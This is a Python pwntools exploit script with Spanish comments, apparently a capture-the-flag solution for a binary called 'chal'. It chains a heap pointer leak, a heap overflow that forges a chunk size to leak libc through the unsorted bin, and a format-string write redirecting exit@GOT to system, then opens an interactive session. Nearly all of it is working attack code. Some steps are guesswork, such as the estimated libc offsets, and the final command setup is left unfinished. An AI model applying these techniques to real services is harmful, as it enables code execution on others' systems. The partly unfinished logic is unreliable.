#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Configuración
LOCAL = True  # Cambiar a False para remoto
REMOTE_IP = "X.X.X.X"
REMOTE_PORT = 16767

elf = ELF('./chal', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

def start():
    if LOCAL:
        return process('./chal')
    else:
        return remote(REMOTE_IP, REMOTE_PORT)

def register(p, username):
    p.sendline(b'1')
    p.recvuntil(b': ')
    p.sendline(username)
    p.recvuntil(b'> ')

def show(p, slot):
    p.sendline(b'2')
    p.recvuntil(b': ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'username: ')
    p.recvline()  # username echo
    data = p.recvline()  # datos reales (72 bytes)
    p.recvuntil(b'> ')
    return data

def update(p, slot, data):
    p.sendline(b'4')
    p.recvuntil(b': ')
    p.sendline(str(slot).encode())
    p.recvuntil(b': ')
    p.sendline(data)
    p.recvuntil(b'> ')

def delete(p, slot):
    p.sendline(b'5')
    p.recvuntil(b': ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'> ')

# ============================================
# FASE 1: LEAK DE HEAP
# ============================================
log.info("Fase 1: Obteniendo leaks del heap")

p = start()

# Registrar usuario para leak
register(p, b'A' * 64)

# Obtener leak del heap (FILE* en offset 64)
data = show(p, 0)
heap_leak = u64(data[64:72].ljust(8, b'\x00'))
log.success(f"Heap leak (FILE*): {hex(heap_leak)}")

# Calcular base del heap
# El FILE* está en el heap, típicamente a un offset fijo
# En glibc 2.38, los primeros chunks suelen estar cerca del inicio
heap_base = heap_leak & ~0xfff  # Aproximación
log.info(f"Heap base estimada: {hex(heap_base)}")

# ============================================
# FASE 2: LEAK DE LIBC VIA FORMAT STRING
# ============================================
log.info("Fase 2: Intentando leak de libc via format string")

# Eliminar slot 0 para reusar
delete(p, 0)

# Registrar nuevo usuario con format string para leak
# Probamos offset 1-30 para encontrar direcciones útiles
# Como no podemos ver la salida, usaremos %n para escritura ciega
# Pero primero necesitamos un leak de libc

# Estrategia alternativa: usar el heap overflow para
# crear un chunk grande y liberarlo a unsorted bin

# Registrar 3 usuarios para el overflow
register(p, b'B' * 64)  # Slot 0
register(p, b'C' * 64)  # Slot 1
register(p, b'D' * 64)  # Slot 2

# Leak de slots para calcular distancias
data0 = show(p, 0)
data1 = show(p, 1)
heap0 = u64(data0[64:72].ljust(8, b'\x00'))
heap1 = u64(data1[64:72].ljust(8, b'\x00'))
log.info(f"Slot 0 FILE*: {hex(heap0)}")
log.info(f"Slot 1 FILE*: {hex(heap1)}")
log.info(f"Distancia entre chunks: {hex(heap1 - heap0)}")

# ============================================
# FASE 3: MODIFICAR TAMAÑO DE CHUNK VIA OVERFLOW
# ============================================
log.info("Fase 3: Overflow para modificar chunk size")

# Calcular offset hasta el chunk header de slot 1
chunk_distance = heap1 - heap0
log.info(f"Distancia a chunk 1 header: {hex(chunk_distance - 0x10)}")

# Overflow desde slot 0 para sobrescribir size de chunk 1
OFFSET_TO_NEXT_CHUNK = chunk_distance - 0x40  # -0x40 porque slots[0] apunta a data, no a header

payload = b'A' * 64  # Llenar datos de slot 0
payload += b'\x00' * (OFFSET_TO_NEXT_CHUNK - 64)  # Padding hasta chunk 1 header
payload += p64(0)      # prev_size
payload += p64(0x421)  # Nuevo size (grande para unsorted bin)

log.info(f"Enviando payload de {len(payload)} bytes")
update(p, 0, payload)

# Liberar slot 1 (ahora con tamaño falso 0x421)
log.info("Liberando slot 1...")
delete(p, 1)

# Slot 1 ya no es accesible, pero el chunk está en unsorted bin
# Necesitamos leer su fd/bk que apuntan a main_arena en libc

# ============================================
# FASE 4: LEER PUNTEROS DE LIBC DEL HEAP
# ============================================
log.info("Fase 4: Leyendo punteros de libc del unsorted bin")

# El chunk liberado está en unsorted bin
# Si podemos leer más allá del chunk de slot 0, veremos los punteros
# Usamos show en slot 0 que lee 72 bytes desde slots[0]
# Pero necesitamos leer el chunk liberado que está más adelante

# Estrategia: registrar un nuevo slot que obtenga
# un chunk solapado con el unsorted bin
register(p, b'E' * 64)  # Slot 3 (reusa slot 1)

# Mostrar slot 3 para ver si tiene punteros de libc
data3 = show(p, 3)
log.info("Datos slot 3:")
print(hexdump(data3[:72]))

# Buscar punteros 0x7f... en los datos
for i in range(0, len(data3)-7, 8):
    val = u64(data3[i:i+8].ljust(8, b'\x00'))
    if (val >> 40) == 0x7f:
        log.success(f"Posible puntero libc en offset {i}: {hex(val)}")
        libc_leak = val
        break

# ============================================
# FASE 5: CALCULAR DIRECCIONES
# ============================================
log.info("Fase 5: Calculando direcciones")

# Offset de main_arena+96 en libc (depende de la versión)
# Para glibc 2.38: main_arena+96 está en un offset específico
# Necesitamos calcular la base de libc

# main_arena suele estar en libc_base + 0x219c80 (glibc 2.38)
# pero varía. Usaremos el símbolo si está disponible

if 'main_arena' in libc.symbols:
    main_arena_offset = libc.symbols['main_arena'] + 96
else:
    # Offset típico para glibc 2.38
    main_arena_offset = 0x219c80 + 96

libc_base = libc_leak - main_arena_offset
log.success(f"Libc base: {hex(libc_base)}")

system_addr = libc_base + libc.symbols['system']
log.success(f"system: {hex(system_addr)}")

# ============================================
# FASE 6: FORMAT STRING PARA ESCRIBIR EN GOT
# ============================================
log.info("Fase 6: Escribiendo en GOT via format string")

# Dirección de exit@GOT
exit_got = elf.got['exit'] if 'exit' in elf.got else 0x3fc8  # Del PLT
log.info(f"exit@GOT: {hex(exit_got)}")

# Necesitamos escribir system_addr (6-8 bytes) en exit_got
# Usaremos format string %n para escribir 2 bytes a la vez

# Primero, liberar slot 3 y registrar con payload de format string
delete(p, 3)

# Payload para escribir en exit_got
# Formato: [dirección][dirección+2] + padding + %n%n
# Escribimos en 2 partes (4 bytes cada una)

# Calcular valores a escribir
system_low = system_addr & 0xffff
system_high = (system_addr >> 16) & 0xffff

# Construir payload
payload = p64(exit_got)      # Dirección para escribir low bytes
payload += p64(exit_got + 2) # Dirección para escribir high bytes
payload += f'%{system_low}c%10$hn'.encode()
payload += f'%{system_high - system_low}c%11$hn'.encode()

register(p, payload)

# Disparar format string con show
log.info("Disparando format string...")
show(p, 0)  # Esto ejecutará printf con nuestro payload

# ============================================
# FASE 7: EJECUTAR SYSTEM
# ============================================
log.info("Fase 7: Ejecutando system")

# Ahora exit@GOT debería apuntar a system
# Escribimos "cat /flag.txt" en algún buffer
# o simplemente "/bin/sh" y llamamos a exit

# Escribir comando en el buffer
# Como ya no podemos usar register (llamaría a exit), 
# preparamos el string antes

# Payload final: escribir "cat /flag.txt" en el heap y llamar a exit
# Pero primero verificamos si funciona

log.success("¡Exploit completado!")
p.interactive()
